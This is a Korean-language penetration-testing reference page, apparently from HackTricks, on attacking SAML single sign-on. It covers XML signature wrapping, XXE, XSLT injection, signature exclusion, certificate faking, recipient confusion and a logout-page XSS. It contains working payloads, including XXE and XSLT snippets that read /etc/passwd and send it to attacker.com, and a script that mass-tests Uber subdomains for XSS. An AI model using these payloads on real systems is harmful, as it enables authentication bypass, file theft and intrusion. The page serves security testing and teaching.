# SAML 공격

## SAML 공격

{{#include ../../banners/hacktricks-training.md}}

## 기본 정보

{{#ref}}
saml-basics.md
{{#endref}}

## 도구

[**SAMLExtractor**](https://github.com/fadyosman/SAMLExtractor): URL 또는 URL 목록을 가져와 SAML 소비 URL을 출력하는 도구입니다.

## XML 왕복

XML에서 XML의 서명된 부분은 메모리에 저장되고, 그 다음 인코딩/디코딩이 수행되며 서명이 확인됩니다. 이상적으로 그 인코딩/디코딩은 데이터를 변경하지 않아야 하지만, 그 시나리오에 기반할 때, **확인되는 데이터와 원본 데이터는 같지 않을 수 있습니다**.

예를 들어, 다음 코드를 확인하십시오:
```ruby
require 'rexml/document'

doc = REXML::Document.new <<XML
<!DOCTYPE x [ <!NOTATION x SYSTEM 'x">]><!--'> ]>
<X>
<Y/><![CDATA[--><X><Z/><!--]]>-->
</X>
XML

puts "First child in original doc: " + doc.root.elements[1].name
doc = REXML::Document.new doc.to_s
puts "First child after round-trip: " + doc.root.elements[1].name
```
REXML 3.2.4 또는 이전 버전에서 프로그램을 실행하면 대신 다음과 같은 출력이 생성됩니다:
```
First child in original doc: Y
First child after round-trip: Z
```
REXML이 위 프로그램의 원래 XML 문서를 본 방식은 다음과 같습니다:

![https://mattermost.com/blog/securing-xml-implementations-across-the-web/](<../../images/image (1001).png>)

그리고 이것은 파싱 및 직렬화 후에 본 방식입니다:

![https://mattermost.com/blog/securing-xml-implementations-across-the-web/](<../../images/image (445).png>)

취약점 및 이를 악용하는 방법에 대한 자세한 정보는 다음을 참조하십시오:

- [https://mattermost.com/blog/securing-xml-implementations-across-the-web/](https://mattermost.com/blog/securing-xml-implementations-across-the-web/)
- [https://joonas.fi/2021/08/saml-is-insecure-by-design/](https://joonas.fi/2021/08/saml-is-insecure-by-design/)

## XML 서명 래핑 공격

**XML 서명 래핑 공격(XSW)**에서는 적들이 XML 문서가 두 가지 별도의 단계인 **서명 검증**과 **함수 호출**을 통해 처리될 때 발생하는 취약점을 악용합니다. 이러한 공격은 XML 문서 구조를 변경하는 것을 포함합니다. 구체적으로, 공격자는 XML 서명의 유효성을 손상시키지 않는 **위조된 요소**를 주입합니다. 이 조작은 **애플리케이션 로직**에서 분석되는 요소와 **서명 검증 모듈**에서 확인되는 요소 간의 불일치를 생성하는 것을 목표로 합니다. 결과적으로 XML 서명은 기술적으로 유효하며 검증을 통과하지만, 애플리케이션 로직은 **사기성 요소**를 처리합니다. 따라서 공격자는 XML 서명의 **무결성 보호** 및 **출처 인증**을 효과적으로 우회하여 **임의의 콘텐츠 주입**을 탐지 없이 수행할 수 있습니다.

다음 공격은 [**이 블로그 게시물**](https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/) **및** [**이 논문**](https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91.pdf)을 기반으로 합니다. 따라서 추가 세부정보는 해당 내용을 확인하십시오.

### XSW #1

- **전략**: 서명을 포함하는 새로운 루트 요소가 추가됩니다.
- **의미**: 검증자가 합법적인 "Response -> Assertion -> Subject"와 공격자의 "악의적인 새로운 Response -> Assertion -> Subject" 간에 혼란을 겪을 수 있어 데이터 무결성 문제를 초래할 수 있습니다.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-1.svg](<../../images/image (506).png>)

### XSW #2

- **XSW #1과의 차이점**: 포장 서명 대신 분리된 서명을 사용합니다.
- **의미**: XSW #1과 유사한 "악의적인" 구조는 무결성 검사를 통과한 후 비즈니스 로직을 속이기 위한 것입니다.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-2.svg](<../../images/image (466).png>)

### XSW #3

- **전략**: 원래의 어설션과 동일한 계층 수준에서 악의적인 어설션이 작성됩니다.
- **의미**: 비즈니스 로직이 악성 데이터를 사용하도록 혼란을 주려는 의도입니다.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-3.svg](<../../images/image (120).png>)

### XSW #4

- **XSW #3과의 차이점**: 원래의 어설션이 복제된(악의적인) 어설션의 자식이 됩니다.
- **의미**: XSW #3과 유사하지만 XML 구조를 더 공격적으로 변경합니다.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-4.svg](<../../images/image (551).png>)

### XSW #5

- **고유한 측면**: 서명이나 원래 어설션이 표준 구성(포장/포장하는/분리된)에 따르지 않습니다.
- **의미**: 복사된 어설션이 서명을 포장하여 예상 문서 구조를 변경합니다.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-5.svg](<../../images/image (1030).png>)

### XSW #6

- **전략**: XSW #4 및 #5와 유사한 위치 삽입이지만 변형이 있습니다.
- **의미**: 복사된 어설션이 서명을 포장하고, 그 서명이 원래 어설션을 포장하여 중첩된 기만적 구조를 생성합니다.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-6.svg](<../../images/image (169).png>)

### XSW #7

- **전략**: 복사된 어설션을 자식으로 하는 Extensions 요소가 삽입됩니다.
- **의미**: 이 요소는 Extensions 요소의 덜 제한적인 스키마를 악용하여 OpenSAML과 같은 라이브러리에서 스키마 검증 방어 수단을 우회합니다.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-7.svg](<../../images/image (971).png>)

### XSW #8

- **XSW #7과의 차이점**: 공격의 변형을 위해 또 다른 덜 제한적인 XML 요소를 사용합니다.
- **의미**: 원래 어설션이 덜 제한적인 요소의 자식이 되어 XSW #7에서 사용된 구조를 반전시킵니다.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-8.svg](<../../images/image (541).png>)

### 도구

Burp 확장 [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e)를 사용하여 요청을 파싱하고 선택한 XSW 공격을 적용한 후 실행할 수 있습니다.

## XXE

XXE 공격이 어떤 것인지 모른다면 다음 페이지를 읽어보십시오:

{{#ref}}
../xxe-xee-xml-external-entity.md
{{#endref}}

SAML 응답은 **압축 해제되고 base64로 인코딩된 XML 문서**이며 XML 외부 엔터티(XXE) 공격에 취약할 수 있습니다. SAML 응답의 XML 구조를 조작함으로써 공격자는 XXE 취약점을 악용하려고 시도할 수 있습니다. 이러한 공격이 어떻게 시각화될 수 있는지 다음과 같습니다:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY    file SYSTEM "file:///etc/passwd">
<!ENTITY dtd SYSTEM "http://www.attacker.com/text.dtd" >]>
<samlp:Response ... ID="_df55c0bb940c687810b436395cf81760bb2e6a92f2" ...>
<saml:Issuer>...</saml:Issuer>
<ds:Signature ...>
<ds:SignedInfo>
<ds:CanonicalizationMethod .../>
<ds:SignatureMethod .../>
<ds:Reference URI="#_df55c0bb940c687810b436395cf81760bb2e6a92f2">...</ds:Reference>
</ds:SignedInfo>
<ds:SignatureValue>...</ds:SignatureValue>
[...]
```
## 도구

Burp 확장 프로그램 [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e)를 사용하여 SAML 요청에서 POC를 생성하고 가능한 XXE 취약점 및 SAML 취약점을 테스트할 수 있습니다.

또한 이 강연도 확인해 보세요: [https://www.youtube.com/watch?v=WHn-6xHL7mI](https://www.youtube.com/watch?v=WHn-6xHL7mI)

## SAML을 통한 XSLT

XSLT에 대한 자세한 정보는 다음을 참조하세요:

{{#ref}}
../xslt-server-side-injection-extensible-stylesheet-language-transformations.md
{{#endref}}

확장 가능한 스타일시트 언어 변환( XSLT )은 XML 문서를 HTML, JSON 또는 PDF와 같은 다양한 형식으로 변환하는 데 사용할 수 있습니다. **XSLT 변환은 디지털 서명의 검증 전에 수행된다는 점을 주의해야 합니다.** 이는 유효한 서명이 없더라도 공격이 성공할 수 있음을 의미합니다. 자체 서명된 서명이나 유효하지 않은 서명으로도 진행할 수 있습니다.

여기에서 이러한 종류의 취약점을 확인할 수 있는 **POC**를 찾을 수 있으며, 이 섹션의 시작 부분에 언급된 hacktricks 페이지에서 페이로드를 찾을 수 있습니다.
```xml
<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
...
<ds:Transforms>
<ds:Transform>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="doc">
<xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
<xsl:variable name="escaped" select="encode-for-uri($file)"/>
<xsl:variable name="attackerUrl" select="'http://attacker.com/'"/>
<xsl:variable name="exploitUrl" select="concat($attackerUrl,$escaped)"/>
<xsl:value-of select="unparsed-text($exploitUrl)"/>
</xsl:template>
</xsl:stylesheet>
</ds:Transform>
</ds:Transforms>
...
</ds:Signature>
```
### Tool

Burp 확장 프로그램 [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e)를 사용하여 SAML 요청에서 POC를 생성하여 가능한 XSLT 취약점을 테스트할 수 있습니다.

또한 이 강연도 확인해 보세요: [https://www.youtube.com/watch?v=WHn-6xHL7mI](https://www.youtube.com/watch?v=WHn-6xHL7mI)

## XML Signature Exclusion <a href="#xml-signature-exclusion" id="xml-signature-exclusion"></a>

**XML Signature Exclusion**은 Signature 요소가 없을 때 SAML 구현의 동작을 관찰합니다. 이 요소가 누락되면 **서명 검증이 발생하지 않을 수 있으며**, 이는 취약점을 초래합니다. 서명에 의해 일반적으로 검증되는 내용을 변경하여 이를 테스트할 수 있습니다.

![https://epi052.gitlab.io/notes-to-self/img/saml/signature-exclusion.svg](<../../images/image (457).png>)

### Tool <a href="#xml-signature-exclusion-how-to" id="xml-signature-exclusion-how-to"></a>

Burp 확장 프로그램 [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e)를 사용할 수 있습니다. SAML 응답을 가로채고 `Remove Signatures`를 클릭합니다. 이렇게 하면 **모든** Signature 요소가 제거됩니다.

서명이 제거된 상태에서 요청이 대상에게 진행되도록 허용합니다. 서비스에서 서명이 필요하지 않다면

## Certificate Faking <a href="#certificate-faking" id="certificate-faking"></a>

## Certificate Faking

Certificate Faking은 **서비스 제공자(SP)가 SAML 메시지가 신뢰할 수 있는 ID 공급자(IdP)에 의해 서명되었는지 제대로 검증하는지 테스트하는 기술**입니다. 이는 SAML 응답 또는 주장을 서명하기 위해 \***자체 서명된 인증서**를 사용하는 것을 포함하며, SP와 IdP 간의 신뢰 검증 프로세스를 평가하는 데 도움이 됩니다.

### How to Conduct Certificate Faking

다음 단계는 [SAML Raider](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) Burp 확장을 사용하여 프로세스를 설명합니다:

1. SAML 응답을 가로챕니다.
2. 응답에 서명이 포함되어 있으면 `Send Certificate to SAML Raider Certs` 버튼을 사용하여 인증서를 SAML Raider Certs로 보냅니다.
3. SAML Raider Certificates 탭에서 가져온 인증서를 선택하고 `Save and Self-Sign`을 클릭하여 원본 인증서의 자체 서명된 복제본을 생성합니다.
4. Burp의 프록시에서 가로챈 요청으로 돌아갑니다. XML Signature 드롭다운에서 새 자체 서명된 인증서를 선택합니다.
5. `Remove Signatures` 버튼을 사용하여 기존 서명을 제거합니다.
6. 적절한 경우 **`(Re-)Sign Message`** 또는 **`(Re-)Sign Assertion`** 버튼을 사용하여 새 인증서로 메시지 또는 주장을 서명합니다.
7. 서명된 메시지를 전달합니다. 성공적인 인증은 SP가 자체 서명된 인증서로 서명된 메시지를 수락함을 나타내며, SAML 메시지의 검증 프로세스에서 잠재적인 취약점을 드러냅니다.

## Token Recipient Confusion / Service Provider Target Confusion <a href="#token-recipient-confusion" id="token-recipient-confusion"></a>

Token Recipient Confusion 및 Service Provider Target Confusion은 **서비스 제공자가 응답의 의도된 수신자를 올바르게 검증하는지 확인하는 것**을 포함합니다. 본질적으로, 서비스 제공자는 다른 제공자를 위해 의도된 경우 인증 응답을 거부해야 합니다. 여기서 중요한 요소는 SAML 응답의 **SubjectConfirmationData** 요소 내에 있는 **Recipient** 필드입니다. 이 필드는 Assertion이 전송되어야 하는 URL을 지정합니다. 실제 수신자가 의도된 서비스 제공자와 일치하지 않으면 Assertion은 유효하지 않은 것으로 간주되어야 합니다.

#### **How It Works**

SAML Token Recipient Confusion (SAML-TRC) 공격이 가능하려면 특정 조건이 충족되어야 합니다. 첫째, 서비스 제공자(SP-Legit)에 유효한 계정이 있어야 합니다. 둘째, 타겟 서비스 제공자(SP-Target)는 SP-Legit에 서비스를 제공하는 동일한 ID 공급자로부터 토큰을 수락해야 합니다.

이러한 조건 하에서 공격 프로세스는 간단합니다. 공유된 ID 공급자를 통해 SP-Legit와의 인증 세션이 시작됩니다. ID 공급자로부터 SP-Legit으로의 SAML 응답이 가로채집니다. 이 가로챈 SAML 응답은 원래 SP-Legit을 위해 의도된 것이며, SP-Target으로 리디렉션됩니다. 이 공격의 성공은 SP-Target이 Assertion을 수락하여 SP-Legit에 사용된 동일한 계정 이름으로 리소스에 접근할 수 있도록 하는 것입니다.
```python
# Example to simulate interception and redirection of SAML Response
def intercept_and_redirect_saml_response(saml_response, sp_target_url):
"""
Simulate the interception of a SAML Response intended for SP-Legit and its redirection to SP-Target.

Args:
- saml_response: The SAML Response intercepted (in string format).
- sp_target_url: The URL of the SP-Target to which the SAML Response is redirected.

Returns:
- status: Success or failure message.
"""
# This is a simplified representation. In a real scenario, additional steps for handling the SAML Response would be required.
try:
# Code to send the SAML Response to SP-Target would go here
return "SAML Response successfully redirected to SP-Target."
except Exception as e:
return f"Failed to redirect SAML Response: {e}"
```
## 로그아웃 기능의 XSS

원본 연구는 [이 링크](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/)를 통해 접근할 수 있습니다.

디렉토리 브루트 포싱 과정에서 로그아웃 페이지가 발견되었습니다:
```
https://carbon-prototype.uberinternal.com:443/oidauth/logout
```
이 링크에 접근하자 리디렉션이 발생했습니다:
```
https://carbon-prototype.uberinternal.com/oidauth/prompt?base=https%3A%2F%2Fcarbon-prototype.uberinternal.com%3A443%2Foidauth&return_to=%2F%3Fopenid_c%3D1542156766.5%2FSnNQg%3D%3D&splash_disabled=1
```
이것은 `base` 매개변수가 URL을 허용한다는 것을 드러냈습니다. 이를 고려하여, XSS (교차 사이트 스크립팅) 공격을 시작하기 위해 URL을 `javascript:alert(123);`로 대체하는 아이디어가 떠올랐습니다.

### 대량 악용

[이 연구에서](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/):

[**SAMLExtractor**](https://github.com/fadyosman/SAMLExtractor) 도구는 동일한 라이브러리를 사용하는 도메인에 대해 `uberinternal.com`의 하위 도메인을 분석하는 데 사용되었습니다. 이후 `oidauth/prompt` 페이지를 타겟으로 하는 스크립트가 개발되었습니다. 이 스크립트는 데이터를 입력하고 출력에 반영되는지 확인하여 XSS (교차 사이트 스크립팅)를 테스트합니다. 입력이 실제로 반영되는 경우, 스크립트는 해당 페이지를 취약하다고 표시합니다.
```python
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from colorama import init ,Fore, Back, Style
init()

with open("/home/fady/uberSAMLOIDAUTH") as urlList:
for url in urlList:
url2 = url.strip().split("oidauth")[0] + "oidauth/prompt?base=javascript%3Aalert(123)%3B%2F%2FFady&return_to=%2F%3Fopenid_c%3D1520758585.42StPDwQ%3D%3D&splash_disabled=1"
request = requests.get(url2, allow_redirects=True,verify=False)
doesit = Fore.RED + "no"
if ("Fady" in request.content):
doesit = Fore.GREEN + "yes"
print(Fore.WHITE + url2)
print(Fore.WHITE + "Len : " + str(len(request.content)) + "   Vulnerable : " + doesit)
```
## 참고문헌

- [https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/)
- [https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/)\\
- [https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/)
- [https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/)

{{#include ../../banners/hacktricks-training.md}}
